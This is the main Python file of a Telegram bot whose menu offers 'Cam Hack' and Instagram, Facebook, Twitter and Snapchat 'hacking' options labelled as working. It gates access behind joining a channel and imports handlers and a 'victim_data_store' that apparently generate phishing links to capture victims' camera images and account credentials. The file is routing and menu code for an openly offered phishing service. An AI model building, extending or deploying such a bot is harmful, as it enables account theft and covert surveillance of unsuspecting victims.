import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
from bot.config import BOT_TOKEN
from bot.buttons import (
    handle_cam_hack,
    handle_insta_button, handle_insta_callback,
    handle_face_button, handle_face_callback,
    handle_twit_button, handle_twit_callback,
    handle_snap_button, handle_snap_callback
)
from bot.server import app
from bot.utils.storage import link_cache, victim_data_store

bot = telebot.TeleBot(BOT_TOKEN)
joined_users = set()

# ========== BOTTOM BUTTONS ==========

def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("📸 Cam Hack"),
        KeyboardButton("📸 Instagram"),
        KeyboardButton("📘 Facebook"),
        KeyboardButton("🐦 Twitter"),
        KeyboardButton("👻 Snapchat"),
        KeyboardButton("📧 Gmail"),
        KeyboardButton("🎮 Free Fire"),
        KeyboardButton("🔗 All Links")
    )
    return markup

# ========== JOIN BUTTONS ==========

def get_join_buttons():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📢 Join @nrtecno2", url="https://t.me/nrtecno2"),
        InlineKeyboardButton("✅ I have joined", callback_data="verify_join")
    )
    return markup

# ========== /START ==========

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    if user_id in joined_users:
        show_main_menu(message)
        return
    bot.send_message(
        user_id,
        "🔐 *Access Restricted*\n\nYou must join @nrtecno2 to use this bot.\n\n👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\nAfter joining, click the button below.",
        reply_markup=get_join_buttons(),
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    user_id = call.from_user.id
    joined_users.add(user_id)
    bot.answer_callback_query(call.id, "✅ Verified!")
    bot.send_message(user_id, "✅ Welcome! You can now use all features.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")

# ========== MAIN MENU ==========

def show_main_menu(message):
    user_id = message.chat.id
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n"
        "📸 Cam Hack (working)\n"
        "📸 Instagram (working)\n"
        "📘 Facebook (working)\n"
        "🐦 Twitter (working)\n"
        "👻 Snapchat (working)\n"
        "📧 Gmail (coming soon)\n"
        "🎮 Free Fire (coming soon)\n"
        "🔗 All Links (coming soon)",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

# ========== ROUTING ==========

@bot.message_handler(func=lambda message: True)
def route_buttons(message):
    text = message.text
    user_id = message.chat.id

    if user_id not in joined_users:
        bot.send_message(user_id, "❌ You must join @nrtecno2 first. Send /start again.", reply_markup=get_join_buttons())
        return

    if text == "📸 Cam Hack":
        handle_cam_hack(bot, message, get_bottom_buttons)
    elif text == "📸 Instagram":
        handle_insta_button(bot, message, get_bottom_buttons)
    elif text == "📘 Facebook":
        handle_face_button(bot, message, get_bottom_buttons)
    elif text == "🐦 Twitter":
        handle_twit_button(bot, message, get_bottom_buttons)
    elif text == "👻 Snapchat":
        handle_snap_button(bot, message, get_bottom_buttons)
    elif text in ["📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
        bot.send_message(user_id, f"⏳ *{text}* coming soon.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
    else:
        bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())

# ========== INLINE CALLBACKS ==========

@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    data = call.data

    # Instagram callbacks
    if data in ["ig_copy", "ig_back", "ig_menu"]:
        handle_insta_callback(bot, call)
        return

    # Facebook callbacks
    if data in ["face_copy", "face_back", "face_menu"]:
        handle_face_callback(bot, call)
        return

    # Twitter callbacks
    if data in ["twit_copy", "twit_back", "twit_menu"]:
        handle_twit_callback(bot, call)
        return

    # Snapchat callbacks
    if data in ["snap_copy", "snap_back", "snap_menu"]:
        handle_snap_callback(bot, call)
        return

    # Generic copy
    if data == "copy":
        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
        return

# ========== RUN BOT ==========

def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("🤖 Bot Running...")
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False)
